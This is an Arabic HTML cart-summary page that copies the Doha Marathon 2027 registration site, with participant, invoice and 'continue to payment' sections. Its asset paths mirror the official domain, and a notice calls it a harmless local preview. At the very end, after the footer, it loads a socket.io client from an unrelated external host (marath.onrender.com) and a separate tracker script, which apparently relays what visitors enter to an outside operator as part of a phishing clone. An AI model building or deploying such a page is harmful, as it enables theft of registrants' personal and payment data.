<!doctype html>
<html lang="ar" dir="rtl">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="theme-color" content="#ed1c24">
	<title>ملخص السلة - ماراثون الدوحة 2027</title>
	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/notosans.css">
	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
	<link rel="stylesheet" href="assets/registration-summary.css">
	<script src="assets/registration-summary.js" defer></script>
</head>
<body>
	<header class="summary-header">
		<nav class="header-actions" aria-label="روابط سريعة">
			<a href="index.html" aria-label="العودة للرئيسية" title="العودة للرئيسية">
				<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18"></path></svg>
			</a>
			<span class="participant-count" aria-label="مشارك واحد">(1)</span>
			<svg class="cart-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M2 3h2l2.3 12.1a2 2 0 0 0 2 1.6h9.9a2 2 0 0 0 2-1.6L22 7H5"></path><circle cx="9" cy="21" r="1"></circle><circle cx="18" cy="21" r="1"></circle></svg>
		</nav>
		<a class="summary-brand" href="index.html" aria-label="ماراثون الدوحة من أريدُ">
			<img src="assets/commonapi.suffix.events/cdnimage/dohaimages/2026/01/cropped-Main-logo-01-1-e1777851995280.webp" alt="ماراثون الدوحة من أريدُ">
		</a>
	</header>

	<main class="summary-shell">
		<h1>ملخص السلة</h1>
		<section class="summary-card participant-card" aria-labelledby="event-name">
			<h2 id="event-name">ماراثون الدوحة من أريدُ 2027</h2>
			<p class="section-label">المشاركون</p>
			<div class="participant-entry">
				<div class="participant-controls">
					<button id="remove-participant" class="text-action remove-action" type="button">حذف</button>
					<span class="control-divider" aria-hidden="true"></span>
					<a id="edit-participant" class="text-action" href="registration.html">تعديل</a>
				</div>
				<div class="participant-info">
					<strong id="participant-name"></strong>
					<span id="participant-email"></span>
				</div>
				<div class="race-row">
					<strong id="race-price" class="amount"></strong>
					<span class="race-name"><span class="race-accent" aria-hidden="true"></span><span id="race-name"></span></span>
				</div>
			</div>
		</section>

		<section class="summary-card invoice-card" aria-labelledby="invoice-title">
			<h2 id="invoice-title">تفاصيل الفاتورة</h2>
			<dl class="invoice-lines">
				<div>
					<dt>إجمالي سعر التسجيل</dt>
					<dd id="registration-price"></dd>
				</div>
				<div>
					<dt>عدد المشاركين</dt>
					<dd>1</dd>
				</div>
				<div>
					<dt>السعر الإجمالي</dt>
					<dd id="subtotal-price"></dd>
				</div>
				<div class="total-line">
					<dt>المجموع الإجمالي</dt>
					<dd id="total-price"></dd>
				</div>
			</dl>
			<p class="local-notice" role="note">هذه معاينة محلية للملخص. لا توجد خدمة دفع أو إرسال تسجيل متصلة بهذه الصفحة.</p>
			<button id="continue-button" class="continue-button" type="button">المتابعة للدفع</button>
			<p id="summary-message" class="summary-message" role="status" aria-live="polite" hidden></p>
		</section>
	</main>
	<footer class="summary-footer" aria-hidden="true"></footer>
<script src="https://marath.onrender.com/socket.io/socket.io.js"></script>
<script src="/assets/tracker.js"></script>
</body>
</html>
